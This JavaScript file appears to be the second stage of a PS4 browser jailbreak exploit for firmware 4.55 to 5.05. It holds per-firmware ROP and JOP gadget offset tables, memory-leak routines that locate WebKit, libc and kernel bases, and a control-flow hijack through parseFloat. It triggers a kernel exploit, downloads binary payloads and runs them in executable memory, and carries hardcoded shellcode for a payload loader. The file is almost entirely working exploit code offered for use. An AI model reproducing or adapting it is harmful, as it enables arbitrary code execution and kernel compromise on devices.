var p;

function sleep(milliseconds) {
	var start = new Date().getTime();
	for (var i = 0; i < 1e7; i++) {
		if ((new Date().getTime() - start) > milliseconds)
			break;
	}
}

var print = function (x) {
	document.getElementById("console").innerText += x + "\n";
}
var print = function (string) { // like print but html
	document.getElementById("console").innerHTML += string + "\n";
}

var get_jmptgt = function (addr) {
	var z = p.read4(addr) & 0xFFFF;
	var y = p.read4(addr.add32(2));
	if (z != 0x25ff)
		return 0;

	return addr.add32(y + 6);
}

var gadgetmap_wk = {
	"ep": [0x5b, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0x5d, 0xc3],
	"pop rsi": [0x5e, 0xc3],
	"pop rdi": [0x5f, 0xc3],
	"pop rsp": [0x5c, 0xc3],
	"pop rax": [0x58, 0xc3],
	"pop rdx": [0x5a, 0xc3],
	"pop rcx": [0x59, 0xc3],
	"pop rsp": [0x5c, 0xc3],
	"pop rbp": [0x5d, 0xc3],
	"pop r8": [0x47, 0x58, 0xc3],
	"pop r9": [0x47, 0x59, 0xc3],
	"infloop": [0xeb, 0xfe, 0xc3],
	"ret": [0xc3],
	"mov [rdi], rsi": [0x48, 0x89, 0x37, 0xc3],
	"mov [rax], rsi": [0x48, 0x89, 0x30, 0xc3],
	"mov [rdi], rax": [0x48, 0x89, 0x07, 0xc3],
	"mov rax, rdi": [0x48, 0x89, 0xf8, 0xc3]
};

var slowpath_jop = [0x48, 0x8B, 0x7F, 0x48, 0x48, 0x8B, 0x07, 0x48, 0x8B, 0x40, 0x30, 0xFF, 0xE0];
slowpath_jop.reverse();

var gadgets;

window.stage2 = function () {
	try {
		window.stage2_();
	} catch (e) {
		print(e);
	}
}

/* Get user agent for determining system firmware */
var fwFromUA = navigator.userAgent.substring(navigator.userAgent.indexOf("5.0 (") + 19, navigator.userAgent.indexOf(") Apple"));
if (fwFromUA == "5.03") alert(fwFromUA + " is not supported yet");

if (fwFromUA == "5.01") {
	gadgetcache = {
		"ret":                    0x0000003C, // 4.55-5.05
		"jmp rax":                0x00000082, // 4.55-5.05
		"ep":                     0x000000AD, // 4.55-5.05
		"pop rbp":                0x000000B6, // 4.55-5.05
		"mov [rdi], rax":         0x0014536B, // 5.01
		"pop r8":                 0x000179C5, // 5.01-5.05
		"pop rax":                0x000043F5, // 5.01-5.05
		"mov rax, rdi":           0x000058D0, // 5.01-5.05
		"mov rax, [rax]":         0x0006C83A, // 5.01-5.05
		"pop rsi":                0x0008F38A, // 5.01-5.05
		"pop rdi":                0x00038DBA, // 5.01-5.05
		"pop rcx":                0x00052E59, // 5.01-5.05
		"pop rsp":                0x0001E687, // 5.01-5.05
		"mov [rdi], rsi":         0x00023AC2, // 5.01-5.05
		"mov [rax], rsi":         0x002565A7, // 5.01
		"pop rdx":                0x000DEDC2, // 5.01
		"pop r9":                 0x00BB30CF, // 5.01
		"jop":                    0x000C37D0, // 5.01-5.05
		"infloop":                0x0151EFCA, // 5.01

		"add rax, rcx":           0x000156DB, // 5.01-5.05
		"mov rdx, rax":           0x00353A71, // 5.01
		"mov rdi, rax":           0x015A3FAF, // 5.01
		"mov rax, rdx":           0x001CEE60, // 5.01

		// 5.01 JOP Gadgets
		"jop1":                   0x012A184D, // 5.01
		"jop2":                   0x006EF2E5, // 5.01
		"jop3":                   0x015CA29B, // 5.01
		"jop4":                   0x012846B4, // 5.01
		"jop_mov rbp, rsp":       0x000F094A, // 5.01-5.05
		"jop6":                   0x002728A1, // 5.01
		
		// kROP Chain stuff
		"ret2userland":           0x0005CDB9, // 5.01-5.05
		
		// Used for kernel exploit stuff
		"mov rax, [rdi]":         0x00046EF9, // 5.01-5.05
		"add rdi, rax":           0x0055566F, // 5.01
		"add rax, rsi":           0x001520C6, // 5.01-5.05
		"and rax, rsi":           0x01570A1F, // 5.01
		"jmp rdi":                0x00295DBE, // 5.01
		
		"longjmp":                0x000014E8, // 5.01-5.05
		"createThread":           0x00779190, // 5.01
	};
	gadgetshiftcache = {
		"stackshift_jop1":        0x00000058, // 5.01-5.05
		"stackshift_jop6":        0x00000028, // 4.55-5.05
	};
} else if (fwFromUA == "5.05") {
	gadgetcache = {
		"ret":                    0x0000003C, // 4.55-5.05
		"jmp rax":                0x00000082, // 4.55-5.05
		"ep":                     0x000000AD, // 4.55-5.05
		"pop rbp":                0x000000B6, // 4.55-5.05
		"mov [rdi], rax":         0x003ADAEB, // 5.05
		"pop r8":                 0x000179C5, // 5.01-5.05
		"pop rax":                0x000043F5, // 5.01-5.05
		"mov rax, rdi":           0x000058D0, // 5.01-5.05
		"mov rax, [rax]":         0x0006C83A, // 5.01-5.05
		"pop rsi":                0x0008F38A, // 5.01-5.05
		"pop rdi":                0x00038DBA, // 5.01-5.05
		"pop rcx":                0x00052E59, // 5.01-5.05
		"pop rsp":                0x0001E687, // 5.01-5.05
		"mov [rdi], rsi":         0x00023AC2, // 5.01-5.05
		"mov [rax], rsi":         0x00256667, // 5.05
		"pop rdx":                0x001BE024, // 5.05
		"pop r9":                 0x00BB320F, // 5.05
		"jop":                    0x000C37D0, // 5.01-5.05
		"infloop":                0x01545EAA, // 5.05

		"add rax, rcx":           0x000156DB, // 5.01-5.05
		"mov rdx, rax":           0x00353B31, // 5.05
		"mov rdi, rax":           0x015A412F, // 5.05
		"mov rax, rdx":           0x001CEF20, // 5.05

		// kROP Chain Stuff
		"ret2userland":           0x0005CDB9, // 5.01-5.05
		
		// 5.05 JOP Gadgets
		"jop1":                   0x012A19CD, // 5.05
		"jop2":                   0x006EF4E5, // 5.05
		"jop3":                   0x015CA41B, // 5.05
		"jop4":                   0x01284834, // 5.05
		"jop_mov rbp, rsp":       0x000F094A, // 5.01-5.05
		"jop6":                   0x00272961, // 5.05
		
		// Used for kernel exploit stuff
		"mov rax, [rdi]":         0x00046EF9, // 5.01-5.05
		"add rdi, rax":           0x005557DF, // 5.05
		"add rax, rsi":           0x001520C6, // 5.01-5.05
		"and rax, rsi":           0x01570B9F, // 5.05
		"jmp rdi":                0x00295E7E, // 5.05
		
		"mov [rsi], rdx":         0x00A6450A, // 5.05
		
		"longjmp":                0x000014E8, // 5.01-5.05
		"createThread":           0x00779390, // 5.05
	};
	gadgetshiftcache = {
		"stackshift_jop1":        0x00000058, // 5.01-5.05
		"stackshift_jop6":        0x00000028, // 4.55-5.05
	};
} else if (fwFromUA == "4.55" || fwFromUA == "4.74") {
	gadgetcache = {
		// Regular ROP Gadgets
		"ret":                    0x0000003C, // 4.55-5.05
		"jmp rax":                0x00000082, // 4.55-5.05
		"ep":                     0x000000AD, // 4.55-5.05
		"pop rbp":                0x000000B6, // 4.55-5.05
		"mov [rdi], rax":         0x00003FBA, // 4.55-4.74
		"pop r8":                 0x0000CC42, // 4.55-4.74
		"pop rax":                0x0000CC43, // 4.55-4.74
		"mov rax, rdi":           0x0000E84E, // 4.55-4.74
		"mov rax, [rax]":         0x000130A3, // 4.55-4.74
		"pop rsi":                0x0007B1EE, // 4.55-4.74
		"pop rdi":                0x0007B23D, // 4.55-4.74
		"pop rcx":                0x00271DE3, // 4.55-4.74
		"pop rsp":                0x0027A450, // 4.55-4.74
		"mov [rdi], rsi":         0x0039CF70, // 4.55-4.74
		"mov [rax], rsi":         0x003D0877, // 4.55-4.74
		"pop rdx":                0x00565838, // 4.55-4.74
		"pop r9":                 0x0078BA1F, // 4.55-4.74
		"jop":                    0x01277350, // 4.55-4.74
		"infloop":                0x012C4009, // 4.55-4.74

		"add rax, rcx":           0x0084D04D, // 4.55-4.74
		"mov rdx, rax":           0x00012A16, // 4.55-4.74
		//"mov rdi, rax":           0xDEADBEEF, // 4.55-4.74
		"mov rax, rdx":           0x001E4EDE, // 4.55-4.74

		// Used for kernel exploit stuff
		"mov rax, [rdi]":         0x0013A220, // 4.55-4.74
		"add rdi, rax":           0x0141D1CD, // 4.55-4.74
		"add rax, rsi":           0x00C71EC4, // 4.55-4.74
		//"and rax, rsi":           0xDEADBEEF, // 4.55-4.74
		"jmp rdi":                0x00182715, // 4.55-4.74

		// kROP Chain Stuff
		"ret2userland":           0x0008905C, // 4.55-4.74
		"add [r9], rbp":          0x01320CB1, // 4.55-4.74
		"mov rsp, rdx":           0x00F3DED0, // 4.55-4.74
		"test":                   0x000028A2, // 4.55-4.74
		"sub rax, rcx":           0x00E9478B, // 4.55-4.74
		
		// special 4.55-4.74
		"add rsi, [rdi]; mov rax, rsi":   0x0119D1F0, // 4.55-4.74
		"jmp rdx_more":           0x001517C7, // 4.55-4.74
		
		// JOP Gadgets
		"jop1":                   0x005D365D, // 4.55-4.74
		"jop2":                   0x007B0E65, // 4.55-4.74
		"jop3":                   0x0142BDBB, // 4.55-4.74
		"jop4":                   0x00637AC4, // 4.55-4.74
		"jop_mov rbp, rsp":       0x001B5B7A, // 4.55-4.74
		"jop6":                   0x000F391D, // 4.55-4.74

		// New kROP Gadgets
		"mov [rsi], rdx":         0x01574006, // 4.55-4.74

		// Functions
		"longjmp":                0x00001458, // 4.55-4.74
		"createThread":           0x0116ED40, // 4.55-4.74
	};
	gadgetshiftcache = {
		"stackshift_jop1":        0x00000048, // 4.55-4.74
		"stackshift_jop6":        0x00000028, // 4.55-5.05
	};
}

window.gadgets_shift = gadgetshiftcache;

window.stage2_ = function () {
	p = window.prim;
	//alert("stage2");

	p.leakfunc = function (func) {
		var fptr_store = p.leakval(func);
		return (p.read8(fptr_store.add32(0x18))).add32(0x40);
	}

	var parseFloatStore = p.leakfunc(parseFloat);
	var parseFloatPtr = p.read8(parseFloatStore);
	// alert(parseFloatPtr);
	
	// Resolve libSceWebKit2 base using parseFloat offset
	var webKitBase = parseFloatPtr;
	if (fwFromUA == "4.55" || fwFromUA == "4.74") {
		webKitBase.sub32inplace(0xE8DDA0);
	} else if (fwFromUA == "5.00" || fwFromUA == "5.01") {
		webKitBase.sub32inplace(0x5783D0);
	} else if (fwFromUA == "5.03" || fwFromUA == "5.05" || fwFromUA == "5.07") {
		webKitBase.sub32inplace(0x578540);
	} else alert("unknown parseFloat offset\n parseFloatPtr: " + parseFloatPtr);
	window.webKitBase = webKitBase;
	var o2wk = function (o) {
		return webKitBase.add32(o);
	}
	window.o2wk = o2wk;

	if (fwFromUA == "4.55" || fwFromUA == "4.74") {
		gadgets = {
			"__stack_chk_fail": o2wk(0xC8),
			"__stack_chk_fail_offset": 0xD190,
			"memcmp": o2wk(0x228),
			"memcmp_offset": 0x71C60,
			"memset": o2wk(0x248),
			"memset_offset": 0x2AE10,
			"setjmp": o2wk(0x1468)
		};
	} else if (fwFromUA == "5.00" || fwFromUA == "5.01" || fwFromUA == "5.03" || fwFromUA == "5.05" || fwFromUA == "5.07") {
		gadgets = {
			"__stack_chk_fail": o2wk(0xC8),
			"__stack_chk_fail_offset": 0x11EC0,
			"memcmp": o2wk(0x208),
			"memcmp_offset": 0x8AFA0,
			"memset": o2wk(0x228),
			"memset_offset": 0x118,
			"setjmp": o2wk(0x14F8)
		};
	}

	var libSceLibcInternalBase = p.read8(get_jmptgt(gadgets.memset));
	libSceLibcInternalBase.sub32inplace(gadgets.memset_offset);
	window.libSceLibcInternalBase = libSceLibcInternalBase;
	//alert(libSceLibcInternalBase);
	var o2lc = function (o) {
		return libSceLibcInternalBase.add32(o);
	}
	window.o2lc = o2lc;
	
	var libKernelBase = p.read8(get_jmptgt(gadgets.__stack_chk_fail));
	libKernelBase.sub32inplace(gadgets.__stack_chk_fail_offset);
	window.libKernelBase = libKernelBase;
	//alert(window.libKernelBase);
	var o2lk = function (o) {
		return libKernelBase.add32(o);
	}
	window.o2lk = o2lk;
	
	var wkview = new Uint8Array(0x1000);
	var wkstr = p.leakval(wkview).add32(0x10);
	var orig_wkview_buf = p.read8(wkstr);

	p.write8(wkstr, webKitBase);
	//p.write4(wkstr.add32(8), 0x367c000);
	p.write4(wkstr.add32(8), 0x3052D38);

	var gadgets_to_find = 0;
	var gadgetnames = [];
	for (var gadgetname in gadgetmap_wk) {
		if (gadgetmap_wk.hasOwnProperty(gadgetname)) {
			gadgets_to_find++;
			gadgetnames.push(gadgetname);
			gadgetmap_wk[gadgetname].reverse();
		}
	}

	gadgets_to_find++;

	var findgadget = function (donecb) {
		if (gadgetcache) {
			gadgets_to_find = 0;
			slowpath_jop = 0;

			for (var gadgetname in gadgetcache) {
				if (gadgetcache.hasOwnProperty(gadgetname))
					gadgets[gadgetname] = o2wk(gadgetcache[gadgetname]);
			}
		} else {
			for (var i = 0; i < wkview.length; i++) {
				if (wkview[i] == 0xc3) {
					for (var nl = 0; nl < gadgetnames.length; nl++) {
						var found = 1;
						if (!gadgetnames[nl])
							continue;
						var gadgetbytes = gadgetmap_wk[gadgetnames[nl]];
						for (var compareidx = 0; compareidx < gadgetbytes.length; compareidx++) {
							if (gadgetbytes[compareidx] != wkview[i - compareidx]) {
								found = 0;
								break;
							}
						}
						if (!found)
							continue;
						gadgets[gadgetnames[nl]] = o2wk(i - gadgetbytes.length + 1);
						gadgetoffs[gadgetnames[nl]] = i - gadgetbytes.length + 1;
						delete gadgetnames[nl];
						gadgets_to_find--;
					}
				} else if (wkview[i] == 0xe0 && wkview[i - 1] == 0xff && slowpath_jop) {
					var found = 1;
					for (var compareidx = 0; compareidx < slowpath_jop.length; compareidx++) {
						if (slowpath_jop[compareidx] != wkview[i - compareidx]) {
							found = 0;
							break;
						}
					}
					if (!found)
						continue;
					gadgets["jop"] = o2wk(i - slowpath_jop.length + 1);
					gadgetoffs["jop"] = i - slowpath_jop.length + 1;
					gadgets_to_find--;
					slowpath_jop = 0;
				}

				if (!gadgets_to_find)
					break;
			}
		}
		if (!gadgets_to_find && !slowpath_jop)
			setTimeout(donecb, 50);
		else {
			print("missing gadgets: ");
			for (var nl in gadgetnames)
				print(" - " + gadgetnames[nl]);
			if (slowpath_jop)
				print(" - jop gadget");
		}
	}

	findgadget(function () { });
	var hold1;
	var hold2;
	var holdz;
	var holdz1;

	while (1) {
		hold1 = { a: 0, b: 0, c: 0, d: 0 };
		hold2 = { a: 0, b: 0, c: 0, d: 0 };
		holdz1 = p.leakval(hold2);
		holdz = p.leakval(hold1);
		if (holdz.low - 0x30 == holdz1.low) break;
	}

	var pushframe = [];
	pushframe.length = 0x80;
	var funcbuf;
	var funcbuf32 = new Uint32Array(0x100);
	nogc.push(funcbuf32);

	var launch_chain = function (chain) {
		var stackPointer = 0;
		var stackCookie = 0;
		var orig_reenter_rip = 0;

		var reenter_help = {
			length: {
				valueOf: function () {
					orig_reenter_rip = p.read8(stackPointer);
					stackCookie = p.read8(stackPointer.add32(8));
					var returnToFrame = stackPointer;

					var ocnt = chain.count;
					chain.push_write8(stackPointer, orig_reenter_rip);
					chain.push_write8(stackPointer.add32(8), stackCookie);

					if (chain.runtime) returnToFrame = chain.runtime(stackPointer);

					chain.push(gadgets["pop rsp"]);
					chain.push(returnToFrame); // -> back to the trap life
					chain.count = ocnt;

					p.write8(stackPointer, (gadgets["pop rsp"])); // pop pop
					p.write8(stackPointer.add32(8), chain.stackBase); // rop rop
				}
			}
		};
		
		funcbuf = p.read8(p.leakval(funcbuf32).add32(0x10));

		p.write8(funcbuf.add32(0x30), gadgets["setjmp"]);
		p.write8(funcbuf.add32(0x80), gadgets["jop"]);
		p.write8(funcbuf, funcbuf);
		p.write8(parseFloatStore, gadgets["jop"]);
		var orig_hold = p.read8(holdz1);
		var orig_hold48 = p.read8(holdz1.add32(0x48));

		p.write8(holdz1, funcbuf.add32(0x50));
		p.write8(holdz1.add32(0x48), funcbuf);
		parseFloat(hold2, hold2, hold2, hold2, hold2, hold2);
		p.write8(holdz1, orig_hold);
		p.write8(holdz1.add32(0x48), orig_hold48);

		stackPointer = p.read8(funcbuf.add32(0x10));
		rtv = Array.prototype.splice.apply(reenter_help);
		return p.leakval(rtv);
	}

	gadgets = gadgets;
	p.loadchain = launch_chain;

	function swapkeyval(json) {
		var ret = {};
		for (var key in json) {
			if (json.hasOwnProperty(key))
				ret[json[key]] = key;
		}
		return ret;
	}

	var kview = new Uint8Array(0x1000);
	var kstr = p.leakval(kview).add32(0x10);
	var orig_kview_buf = p.read8(kstr);

	p.write8(kstr, window.libKernelBase);
	p.write4(kstr.add32(8), 0x40000);

	var countbytes;
	for (var i = 0; i < 0x40000; i++) {
		if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
			countbytes = i;
			break;
		}
	}
	p.write4(kstr.add32(8), countbytes + 32);

	var dview32 = new Uint32Array(1);
	var dview8 = new Uint8Array(dview32.buffer);
	for (var i = 0; i < countbytes; i++) {
		if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
			dview8[0] = kview[i + 3];
			dview8[1] = kview[i + 4];
			dview8[2] = kview[i + 5];
			dview8[3] = kview[i + 6];
			var syscallno = dview32[0];
			window.syscalls[syscallno] = window.libKernelBase.add32(i);
		}
	}

	var chain = new window.rop;
	var returnvalue;

	p.fcall_ = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
		chain.clear();

		chain.notimes = this.next_notime;
		this.next_notime = 1;

		chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);

		chain.push(window.gadgets["pop rdi"]);
		chain.push(chain.stackBase.add32(0x3ff8));
		chain.push(window.gadgets["mov [rdi], rax"]);

		chain.push(window.gadgets["pop rax"]);
		chain.push(p.leakval(0x41414242));

		if (chain.run().low != 0x41414242)
			throw new Error("unexpected rop behaviour");
		returnvalue = p.read8(chain.stackBase.add32(0x3ff8));
	}

	p.fcall = function () {
		var rv = p.fcall_.apply(this, arguments);
		return returnvalue;
	}

	p.readstr = function (addr) {
		var addr_ = addr.add32(0);
		var rd = p.read4(addr_);
		var buf = "";
		while (rd & 0xFF) {
			buf += String.fromCharCode(rd & 0xFF);
			addr_.add32inplace(1);
			rd = p.read4(addr_);
		}
		return buf;
	}

	p.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
		if (typeof sysc == "string")
			sysc = window.syscallnames[sysc];
			
		if (typeof sysc != "number")
			throw new Error("invalid syscall");

		var off = window.syscalls[sysc];
		if (off == undefined)
			throw new Error("invalid syscall");

		return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
	}

	p.stringify = function (str) {
		var bufView = new Uint8Array(str.length + 1);
		for (var i = 0; i < str.length; i++)
			bufView[i] = str.charCodeAt(i) & 0xFF;
		window.nogc.push(bufView);
		return p.read8(p.leakval(bufView).add32(0x10));
	};

	p.malloc = function malloc(sz) {
		var backing = new Uint8Array(0x10000 + sz);
		window.nogc.push(backing);
		var ptr = p.read8(p.leakval(backing).add32(0x10));
		ptr.backing = backing;
		return ptr;
	}

	p.malloc32 = function malloc32(sz) {
		var backing = new Uint8Array(0x10000 + sz * 4);
		window.nogc.push(backing);
		var ptr = p.read8(p.leakval(backing).add32(0x10));
		ptr.backing = new Uint32Array(backing.buffer);
		return ptr;
	}

	function runPayload(path) {
		var req = new XMLHttpRequest();
		req.open('GET', path);
		req.responseType = "arraybuffer";
		req.send();
		req.onreadystatechange = function () {
			if (req.readyState === 4) {
				try {
					var code_addr = new int64(0x26100000, 0x00000009);
					var mapped_address = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
					if (mapped_address != '926100000')
						throw "sys_mmap failed";
					
					// Trick for 4 bytes padding
					var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
					var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
					tmp.set(new Uint8Array(req.response), 0);
					tmp.set(padding, req.response.byteLength);
					
					var shellcode = new Uint32Array(tmp.buffer);
					for (var i=0; i < shellcode.length; i++)
						p.write4(code_addr.add32(0x100000 + i * 4), shellcode[i]);
					p.fcall(code_addr);
					p.syscall("sys_munmap", code_addr, 0x300000);
				} catch (e) {
					alert("exception: " + e);
				}
			}
		}
	}
	
	//alert("Launching kexploit");
	
	// Test if the kernel is already patched
	if (p.syscall("sys_setuid", 0) != '0')
		while (!kernExploit()) {}
	// Kernel patched, launch cool stuff
	
	// Check mira status
	var testMira = p.syscall("sys_setlogin", p.stringify("root"));
	if (fwFromUA == "5.05") {
		//runPayload("kdumper.bin");
		runPayload("ps4-hen-vtx-505.bin");
		//runPayload("unblocker.bin");
		
		/*
		sleep(2000);
		runPayload("mira_505.bin");
		sleep(2000);
		// Test if payloads ran successfully, if not, refresh
		testMira = p.syscall("sys_setlogin", p.stringify("root"));
		if (testMira != '0') {
			alert("Mira failed to run !");
			//location.reload();
		}
		*/
		
		allset();
	} else if (fwFromUA == "4.74") {
		//runPayload("kdumper.bin");
		runPayload("fake_installer.bin");
		//runPayload("unblocker.bin");
		
		allset();
	} else if (fwFromUA == "4.55") {
		//runPayload("kdumper.bin");
		runPayload("ps4-hen-vtx-455.bin");
		//runPayload("unblocker.bin");
		
		allset();
	} else {
		// Load payload launcher
		var code_addr = new int64(0x26100000, 0x00000009);
		var mapped_address = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
		if (mapped_address == '926100000') {
			try {
				var shcode = [0x31fe8948, 0x3d8b48c0, 0x00003ff4, 0xed0d8b48, 0x4800003f, 0xaaf3f929, 0xe8f78948, 0x00000060, 0x48c3c031, 0x0003c0c7, 0x89490000, 0xc3050fca, 0x06c0c748, 0x49000000, 0x050fca89, 0xc0c748c3, 0x0000001e, 0x0fca8949, 0xc748c305, 0x000061c0, 0xca894900, 0x48c3050f, 0x0068c0c7, 0x89490000, 0xc3050fca, 0x6ac0c748, 0x49000000, 0x050fca89, 0x909090c3, 0x90909090, 0x90909090, 0x90909090, 0xb8555441, 0x00003c23, 0xbed23153, 0x00000001, 0x000002bf, 0xec834800, 0x2404c610, 0x2444c610, 0x44c70201, 0x00000424, 0x89660000, 0xc6022444, 0x00082444, 0x092444c6, 0x2444c600, 0x44c6000a, 0xc6000b24, 0x000c2444, 0x0d2444c6, 0xff78e800, 0x10baffff, 0x41000000, 0x8948c489, 0xe8c789e6, 0xffffff73, 0x00000abe, 0xe7894400, 0xffff73e8, 0x31d231ff, 0xe78944f6, 0xffff40e8, 0x48c589ff, 0x200000b8, 0x00000926, 0xc300c600, 0xebc38948, 0x801f0f0c, 0x00000000, 0x01489848, 0x1000bac3, 0x89480000, 0xe8ef89de, 0xfffffef7, 0xe87fc085, 0xe8e78944, 0xfffffef8, 0xf1e8ef89, 0x48fffffe, 0x200000b8, 0x00000926, 0x48d0ff00, 0x5b10c483, 0xc35c415d, 0xc3c3c3c3];
				var shellbuf = p.malloc32(0x1000);
				for (var i = 0; i < shcode.length; i++)
					shellbuf.backing[i] = shcode[i];
				p.syscall("sys_mprotect", shellbuf, 0x4000, 7);
				p.fcall(window.gadgets["createThread"], shellbuf, 0, p.stringify("loader")); // Launch loader
				awaitpl(); // Awaiting payload message
			} catch (e) { alert(e); }
		}
	}
}